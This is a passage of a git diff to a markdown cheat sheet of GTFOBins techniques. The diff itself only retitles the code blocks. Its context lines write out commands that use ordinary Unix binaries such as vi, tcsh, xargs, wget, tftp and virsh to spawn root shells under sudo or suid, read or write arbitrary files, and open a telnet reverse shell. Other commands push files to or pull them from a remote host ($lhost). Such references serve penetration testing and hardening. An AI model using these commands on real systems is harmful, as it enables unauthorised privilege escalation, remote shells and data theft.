 tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z $cmd_file
 ```
 <!-- cheat
@@ -9887,7 +10061,7 @@ var cmd_file
 
 This saves the packet dump (count is 1) from the loopback interface to a file. To trigger the capture use something like:  ``` nc -u localhost 1 <<<$data ```  While `user` is the owner of the packet dump file, the invoking user must be able to capture traffic on the device.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tcpdump file-write (sudo / suid / unprivileged)"
 tcpdump -ln -i lo -w $file_out -c 1 -Z user
 ```
 <!-- cheat
@@ -9900,7 +10074,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tcsh shell (sudo / suid / unprivileged)"
 tcsh
 ```
 <!-- cheat
@@ -9908,7 +10082,9 @@ tcsh
 
 #### tcsh shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins tcsh shell - suid override (suid variant)"
 tcsh -b
 ```
 <!-- cheat
@@ -9918,7 +10094,7 @@ tcsh -b
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tcsh file-write (sudo / suid / unprivileged)"
 tcsh -c 'echo $data >$file_out'
 ```
 <!-- cheat
@@ -9928,7 +10104,9 @@ var file_out
 
 #### tcsh file-write - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins tcsh file-write - suid override (suid variant)"
 tcsh -bc 'echo $data >$file_out'
 ```
 <!-- cheat
@@ -9942,7 +10120,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tdbtool shell (sudo / suid / unprivileged)"
 tdbtool
 ! /bin/sh
 ```
@@ -9955,7 +10133,7 @@ tdbtool
 
 Use `-a` to append data to exising files.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tee file-write (sudo / suid / unprivileged)"
 echo $data | tee $file_out
 ```
 <!-- cheat
@@ -9969,7 +10147,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins telnet shell (sudo / suid / unprivileged)"
 telnet
 !/bin/sh
 ```
@@ -9980,7 +10158,7 @@ telnet
 
 The shell process is not spawn by `openssl`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins telnet reverse-shell (sudo / suid / unprivileged)"
 mkfifo $tmp_sock
 telnet $lhost $lport <$tmp_sock | /bin/sh >$tmp_sock
 ```
@@ -9996,7 +10174,7 @@ var tmp_sock
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins terraform file-read (sudo / suid / unprivileged)"
 terraform console
 file("$file_in")
 ```
@@ -10010,7 +10188,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tex shell (sudo / suid / unprivileged)"
 tex --shell-escape '\immediate\write18{/bin/sh}'
 ```
 <!-- cheat
@@ -10022,7 +10200,7 @@ tex --shell-escape '\immediate\write18{/bin/sh}'
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tftp download (sudo / suid / unprivileged)"
 tftp $lhost
 get $file_in
 ```
@@ -10035,7 +10213,7 @@ var file_in
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tftp upload (sudo / suid / unprivileged)"
 tftp $lhost
 put $file_in
 ```
@@ -10050,7 +10228,7 @@ var file_in
 
 This translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tic file-read (sudo / suid / unprivileged)"
 tic -C $file_in
 ```
 <!-- cheat
@@ -10063,7 +10241,7 @@ var file_in
 
 Note that the shell might have its own builtin `time` implementation, which may behave differently than the binary, which is often located at `/usr/bin/time`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins time shell (sudo / suid / unprivileged)"
 time /bin/sh
 ```
 <!-- cheat
@@ -10071,7 +10249,9 @@ time /bin/sh
 
 #### time shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins time shell - suid override (suid variant)"
 time /bin/sh -p
 ```
 <!-- cheat
@@ -10085,7 +10265,7 @@ This might not work if run by unprivileged users depending on the system configu
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins timedatectl inherit (inherits from less) (sudo / unprivileged)"
 timedatectl list-timezones
 ```
 <!-- cheat
@@ -10097,7 +10277,7 @@ timedatectl list-timezones
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins timeout shell (sudo / suid / unprivileged)"
 timeout 0 /bin/sh
 ```
 <!-- cheat
@@ -10105,7 +10285,9 @@ timeout 0 /bin/sh
 
 #### timeout shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins timeout shell - suid override (suid variant)"
 timeout 0 /bin/sh -p
 ```
 <!-- cheat
@@ -10117,7 +10299,7 @@ timeout 0 /bin/sh -p
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tmate shell (sudo / suid / unprivileged)"
 tmate -c /bin/sh
 ```
 <!-- cheat
@@ -10129,7 +10311,7 @@ tmate -c /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tmux shell #1 (sudo / suid / unprivileged)"
 tmux -c /bin/sh
 ```
 <!-- cheat
@@ -10139,7 +10321,7 @@ tmux -c /bin/sh
 
 Provided to have enough permissions to access the socket (e.g., `/tmp/tmux-xxx/default`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tmux shell #2 (sudo / suid / unprivileged)"
 tmux -S $socket
 ```
 <!-- cheat
@@ -10150,7 +10332,7 @@ var socket
 
 The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tmux file-read (sudo / suid / unprivileged)"
 tmux -f $file_in
 ```
 <!-- cheat
@@ -10163,7 +10345,7 @@ var file_in
 
 The config path might be different.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins top shell (sudo / unprivileged)"
 echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
 top
 # press return twice
@@ -10178,7 +10360,7 @@ reset
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins torify shell (sudo / unprivileged)"
 torify /bin/sh
 ```
 <!-- cheat
@@ -10190,7 +10372,7 @@ torify /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins torsocks shell (sudo / unprivileged)"
 torsocks /bin/sh
 ```
 <!-- cheat
@@ -10202,7 +10384,7 @@ torsocks /bin/sh
 
 The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins troff file-read (sudo / suid / unprivileged)"
 troff $file_in
 ```
 <!-- cheat
@@ -10215,7 +10397,7 @@ var file_in
 
 Content is leaked as error messages. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins tsc file-read (sudo / unprivileged)"
 tsc $file_in.ts
 ```
 <!-- cheat
@@ -10226,7 +10408,7 @@ var file_in
 
 Content is leaked as error messages and written to file. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins tsc file-write (sudo / unprivileged)"
 tsc $file_in.ts --outFile $file_out
 ```
 <!-- cheat
@@ -10240,7 +10422,7 @@ var file_out
 
 This allows to run Lua code (`...`).
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins tshark inherit (inherits from lua) (sudo / unprivileged)"
 echo '...' >$tmp_file
 tshark -Xlua_script:$tmp_file
 ```
@@ -10254,7 +10436,7 @@ var tmp_file
 
 The read file content is corrupted by replacing occurrences of `$'\b_'` to terminal sequences and by converting tabs to spaces.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ul file-read (sudo / suid / unprivileged)"
 ul $file_in
 ```
 <!-- cheat
@@ -10267,7 +10449,7 @@ var file_in
 
 Convert sequences of (e.g., `999`) spaces to tab.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins unexpand file-read (sudo / suid / unprivileged)"
 unexpand -t999 $file_in
 ```
 <!-- cheat
@@ -10280,7 +10462,7 @@ var file_in
 
 The read file content is corrupted by squashing multiple adjacent lines.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins uniq file-read (sudo / suid / unprivileged)"
 uniq $file_in
 ```
 <!-- cheat
@@ -10293,7 +10475,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins unshare shell (sudo / suid / unprivileged)"
 unshare /bin/sh
 ```
 <!-- cheat
@@ -10301,7 +10483,9 @@ unshare /bin/sh
 
 #### unshare shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins unshare shell - suid override (suid variant)"
 unshare -r /bin/sh
 ```
 <!-- cheat
@@ -10315,7 +10499,7 @@ unshare -r /bin/sh
 
 Escalate privileges directly.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins unsquashfs privilege-escalation (sudo / suid)"
 unsquashfs shell
 ./squashfs-root/sh -p
 ```
@@ -10330,7 +10514,7 @@ Certain `unzip` versions allows to preserve the SUID bit. For example, prepare a
 
 Escalate privileges directly.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins unzip privilege-escalation (sudo / suid)"
 unzip -K shell.zip
 ./sh -p
 ```
@@ -10343,7 +10527,7 @@ unzip -K shell.zip
 
 Write in `$file_out` a symlink to `$tmp_file`.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins update-alternatives file-write (sudo / suid)"
 echo $data >$tmp_file
 update-alternatives --force --install $file_out x $tmp_file 0
 ```
@@ -10359,7 +10543,7 @@ var tmp_file
 
 This is part of `gettext` and usually not in `PATH`, e.g., on Arch it can be found at `/usr/lib/gettext/urlget`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins urlget file-read (sudo / suid / unprivileged)"
 urlget - $file_in
 ```
 <!-- cheat
@@ -10372,7 +10556,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins uuencode file-read (sudo / suid / unprivileged)"
 uuencode $file_in /dev/stdout | uudecode
 ```
 <!-- cheat
@@ -10385,7 +10569,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins uv shell (sudo / unprivileged)"
 uv run /bin/sh
 ```
 <!-- cheat
@@ -10397,7 +10581,7 @@ uv run /bin/sh
 
 This allows to run Ruby code (`...`).
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins vagrant inherit (inherits from ruby) (sudo / unprivileged)"
 echo '...' >Vagrantfile
 vagrant up
 ```
@@ -10410,7 +10594,7 @@ vagrant up
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins valgrind shell (sudo / unprivileged)"
 valgrind /bin/sh
 ```
 <!-- cheat
@@ -10424,7 +10608,7 @@ A running `varnishd` instance must be available.
 
 The command hangs, so the trigger command must be performed asynchronously or in another terminal:  ``` curl -H 'xxx: $data' http://localhost:6081/xxxxxxxxxx ```
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins varnishncsa file-write (sudo / suid)"
 varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w $file_out
 ```
 <!-- cheat
@@ -10437,7 +10621,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins vi shell #1 (sudo / suid / unprivileged)"
 vi -c ':!/bin/sh' /dev/null
 ```
 <!-- cheat
@@ -10447,7 +10631,7 @@ vi -c ':!/bin/sh' /dev/null
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins vi shell #2 (sudo / suid / unprivileged)"
 vi -c ':shell'
 ```
 <!-- cheat
@@ -10457,7 +10641,7 @@ vi -c ':shell'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins vi shell #3 (sudo / suid / unprivileged)"
 vi -c ':set shell=/bin/sh | shell'
 ```
 <!-- cheat
@@ -10465,7 +10649,9 @@ vi -c ':set shell=/bin/sh | shell'
 
 #### vi shell #3 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins vi shell #3 - suid override (suid variant)"
 vi -c ':set shell=/bin/sh\ -p | shell'
 ```
 <!-- cheat
@@ -10475,7 +10661,7 @@ vi -c ':set shell=/bin/sh\ -p | shell'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins vi shell #4 (sudo / suid / unprivileged)"
 vi -c :terminal /bin/sh
 ```
 <!-- cheat
@@ -10483,7 +10669,9 @@ vi -c :terminal /bin/sh
 
 #### vi shell #4 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins vi shell #4 - suid override (suid variant)"
 vi -c ':terminal /bin/sh -p'
 ```
 <!-- cheat
@@ -10493,7 +10681,7 @@ vi -c ':terminal /bin/sh -p'
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins vi file-read (sudo / suid / unprivileged)"
 vi $file_in
 ```
 <!-- cheat
@@ -10504,7 +10692,7 @@ var file_in
 
 Where `^[` is the escape key.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins vi file-write (sudo / suid / unprivileged)"
 vi $file_out
 iDATA
 ^[
@@ -10524,7 +10712,7 @@ Alias of [vim](#vim). All techniques from `vim` apply.
 
 Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins vigr inherit (inherits from vi) (sudo / suid)"
 vigr
 ```
 <!-- cheat
@@ -10536,7 +10724,7 @@ vigr
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins vim file-read (sudo / suid / unprivileged)"
 vim -c ':redir! >$file_out | echo "$data" | redir END | q'
 ```
 <!-- cheat
@@ -10548,7 +10736,7 @@ var file_out
 
 This allows to run Python code (`...`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins vim inherit #1 (inherits from python) (sudo / suid / unprivileged)"
 vim -c ':py ...'
 ```
 <!-- cheat
@@ -10558,7 +10746,7 @@ vim -c ':py ...'
 
 This allows to run Lua code (`...`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins vim inherit #2 (inherits from lua) (sudo / suid / unprivileged)"
 vim -c ':lua ...'
 ```
 <!-- cheat
@@ -10568,7 +10756,7 @@ vim -c ':lua ...'
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins vim inherit #3 (inherits from vi) (sudo / suid / unprivileged)"
 vim
 ```
 <!-- cheat
@@ -10584,7 +10772,7 @@ Alias of [vim](#vim). All techniques from `vim` apply.
 
 Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins vipw inherit (inherits from vi) (sudo / suid)"
 vipw
 ```
 <!-- cheat
@@ -10596,7 +10784,7 @@ vipw
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo"
+```sh title:"GTFOBins virsh command (sudo)"
 cat >$tmp_file <<EOF
 <domain type='kvm'>
   <name>x</name>
@@ -10623,7 +10811,7 @@ var tmp_file
 
 This requires the user to be in the `libvirt` group. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins virsh file-write #1 (sudo / unprivileged)"
 echo $data >$tmp_file
 
 cat >$tmp_file <<EOF
@@ -10662,7 +10850,7 @@ var tmp_file
 
 This requires the user to be in the `libvirt` group.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins virsh file-write #2 (sudo / unprivileged)"
 virsh -c qemu:///system pool-create-as x dir --target $dir/
 virsh -c qemu:///system vol-download --pool x input-file output-file
 virsh -c qemu:///system pool-destroy x
@@ -10679,7 +10867,7 @@ This allows to run Python code (`...`). Some valid core dump file is required, i
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins volatility inherit (inherits from python) (sudo / suid / unprivileged)"
 volatility -f $core volshell
 ...
 ```
@@ -10693,7 +10881,7 @@ var core
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins w3m file-read (sudo / suid / unprivileged)"
 w3m -dump $file_in
 ```
 <!-- cheat
@@ -10706,7 +10894,7 @@ var file_in
 
 The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`).
 
-```sh title:"sudo"
+```sh title:"GTFOBins wall file-read (sudo)"
 wall --nobanner $file_in
 ```
 <!-- cheat
@@ -10719,7 +10907,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins watch shell #1 (sudo / suid / unprivileged)"
 watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
 ```
 <!-- cheat
@@ -10727,7 +10915,9 @@ watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
 
 #### watch shell #1 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins watch shell #1 - suid override (suid variant)"
 watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'
 ```
 <!-- cheat
@@ -10737,7 +10927,7 @@ watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins watch shell #2 (sudo / suid / unprivileged)"
 watch 'reset; exec /bin/sh 1>&0 2>&0'
 ```
 <!-- cheat
@@ -10749,7 +10939,7 @@ watch 'reset; exec /bin/sh 1>&0 2>&0'
 
 The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins wc file-read (sudo / suid / unprivileged)"
 wc --files0-from $file_in
 ```
 <!-- cheat
@@ -10762,7 +10952,7 @@ var file_in
 
 Use `wg-quick down $tmp_file` in order to be able to run the shell again.
 
-```sh title:"sudo"
+```sh title:"GTFOBins wg-quick shell (sudo)"
 cat >$tmp_file <<EOF
 [Interface]
 PostUp = /bin/sh
@@ -10780,7 +10970,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins wget shell (sudo / suid / unprivileged)"
 echo -e '#!/bin/sh\n/bin/sh 1>&0' >$tmp_file
 chmod +x $tmp_file
 wget --use-askpass=$tmp_file 0
@@ -10791,7 +10981,9 @@ var tmp_file
 
 #### wget shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins wget shell - suid override (suid variant)"
 echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$tmp_file
 chmod +x $tmp_file
 wget --use-askpass=$tmp_file 0
@@ -10804,7 +10996,7 @@ var tmp_file
 
 The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins wget file-read (sudo / suid / unprivileged)"
 wget -i $file_in
 ```
 <!-- cheat
@@ -10815,7 +11007,7 @@ var file_in
 
 The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins wget file-write (sudo / suid / unprivileged)"
 wget -i $file_in -o $file_out
 ```
 <!-- cheat
@@ -10827,7 +11019,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins wget download (sudo / suid / unprivileged)"
 wget $scheme://$lhost$file_in -O $file_out
 ```
 <!-- cheat
@@ -10841,7 +11033,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins wget upload #1 (sudo / suid / unprivileged)"
 wget --post-file=$file_in $scheme://$lhost
 ```
 <!-- cheat
@@ -10854,7 +11046,7 @@ var file_in
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins wget upload #2 (sudo / suid / unprivileged)"
 wget --post-data=$data $scheme://$lhost
 ```
 <!-- cheat
@@ -10869,7 +11061,7 @@ var data
 
 The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins whiptail file-read (sudo / suid / unprivileged)"
 whiptail --textbox --scrolltext $file_in 0 0
 ```
 <!-- cheat
@@ -10882,7 +11074,7 @@ var file_in
 
 Received data has instances of the `\r` byte stripped.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins whois download (sudo / suid / unprivileged)"
 whois -h $lhost -p $lport x
 ```
 <!-- cheat
@@ -10894,7 +11086,7 @@ import lports
 
 Data is converted to lower case, and has a trailing `\r\n`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins whois upload (sudo / suid / unprivileged)"
 whois -h $lhost -p $lport $data
 ```
 <!-- cheat
@@ -10909,7 +11101,7 @@ var data
 
 This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.  After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:  1. select the only received packet;  2. right-click on "Data" from the "Packet Details" pane, and select "Export Packet Bytes...";  3. choose where to save the packet dump.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins wireshark file-write (sudo / unprivileged)"
 wireshark -c 1 -i lo -k -f 'udp port $lport' &
 echo $data | nc -u 127.127.127.127 $lport
 ```
@@ -10922,7 +11114,7 @@ var data
 
 This requires GUI interaction. Start Wireshark, then from the main menu, select "Tools" -> "Lua" -> "Evaluate". A window opens that allows to execute Lua code.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins wireshark inherit (inherits from lua) (sudo / unprivileged)"
 wireshark
 ```
 <!-- cheat
@@ -10934,7 +11126,7 @@ wireshark
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins wish inherit (inherits from tclsh) (sudo / suid / unprivileged)"
 wish
 ```
 <!-- cheat
@@ -10946,7 +11138,7 @@ wish
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins xargs shell #1 (sudo / suid / unprivileged)"
 xargs -a /dev/null /bin/sh
 ```
 <!-- cheat
@@ -10954,7 +11146,9 @@ xargs -a /dev/null /bin/sh
 
 #### xargs shell #1 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins xargs shell #1 - suid override (suid variant)"
 xargs -a /dev/null /bin/sh -p
 ```
 <!-- cheat
@@ -10964,7 +11158,7 @@ xargs -a /dev/null /bin/sh -p
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins xargs shell #2 (sudo / suid / unprivileged)"
 xargs -a /dev/null /bin/sh
 ```
 <!-- cheat
@@ -10972,7 +11166,9 @@ xargs -a /dev/null /bin/sh
 
 #### xargs shell #2 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins xargs shell #2 - suid override (suid variant)"
 xargs -a /dev/null /bin/sh -p
 ```
 <!-- cheat
@@ -10982,7 +11178,7 @@ xargs -a /dev/null /bin/sh -p
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins xargs shell #3 (sudo / suid / unprivileged)"
 echo x | xargs -o -a /dev/null /bin/sh
 ```
 <!-- cheat
@@ -10990,7 +11186,9 @@ echo x | xargs -o -a /dev/null /bin/sh
 
 #### xargs shell #3 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins xargs shell #3 - suid override (suid variant)"
 echo x | xargs -o -a /dev/null /bin/sh -p
 ```
 <!-- cheat
@@ -11000,7 +11198,7 @@ echo x | xargs -o -a /dev/null /bin/sh -p
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins xargs file-read (sudo / suid / unprivileged)"
 xargs -a $file_in -0
 ```
 <!-- cheat
@@ -11015,7 +11213,7 @@ The current implementation of `xdg-user-dir` is basically `eval echo \${XDG_${1}
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins xdg-user-dir shell (sudo / unprivileged)"
 xdg-user-dir '}; /bin/sh #'
 ```
 <!-- cheat
@@ -11029,7 +11227,7 @@ This requires a running X server.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins xdotool shell (sudo / suid / unprivileged)"
 xdotool exec --sync /bin/sh
 ```
 <!-- cheat
@@ -11037,7 +11235,9 @@ xdotool exec --sync /bin/sh
 
 #### xdotool shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins xdotool shell - suid override (suid variant)"
 xdotool exec --sync /bin/sh -p
 ```
 <!-- cheat
@@ -11059,7 +11259,7 @@ This requires a running X server.
 
 The read file content is corrupted by error prints.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins xmodmap file-read (sudo / suid / unprivileged)"
 xmodmap -v $file_in
 ```
 <!-- cheat
@@ -11074,7 +11274,7 @@ This requires a running X server.
 
 The file is displayed in a graphical window.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins xmore file-read (sudo / suid / unprivileged)"
 xmore $file_in
 ```
 <!-- cheat
@@ -11089,7 +11289,7 @@ This requires a running X server.
 
 The file is displayed in a graphical window.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins xpad file-read (sudo / suid / unprivileged)"
 xpad -f $file_in
 ```
 <!-- cheat
@@ -11102,7 +11302,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins xxd file-read (sudo / suid / unprivileged)"
 xxd $file_in | xxd -r
 ```
 <!-- cheat
@@ -11113,7 +11313,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins xxd file-write (sudo / suid / unprivileged)"
 echo $data | xxd | xxd -r - $file_out
 ```
 <!-- cheat
@@ -11127,7 +11327,7 @@ var file_out
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins xz file-read (sudo / suid / unprivileged)"
 xz -c $file_in | xz -d
 ```
 <!-- cheat
@@ -11140,7 +11340,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins yarn shell #1 (sudo / unprivileged)"
 yarn exec /bin/sh
 ```
 <!-- cheat
@@ -11150,7 +11350,7 @@ yarn exec /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins yarn shell #2 (sudo / unprivileged)"
 echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
 yarn --cwd .
 ```
@@ -11161,7 +11361,7 @@ yarn --cwd .
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins yarn shell #3 (sudo / unprivileged)"
 echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
 yarn --cwd . xxx
 ```
@@ -11174,7 +11374,7 @@ yarn --cwd . xxx
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins yash shell (sudo / suid / unprivileged)"
 yash
 ```
 <!-- cheat
@@ -11186,7 +11386,7 @@ yash
 
 This spawns a graphical window containing the file content somehow corrupted by word wrapping.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins yelp file-read (sudo / unprivileged)"
 yelp man:$file_in
 ```
 <!-- cheat
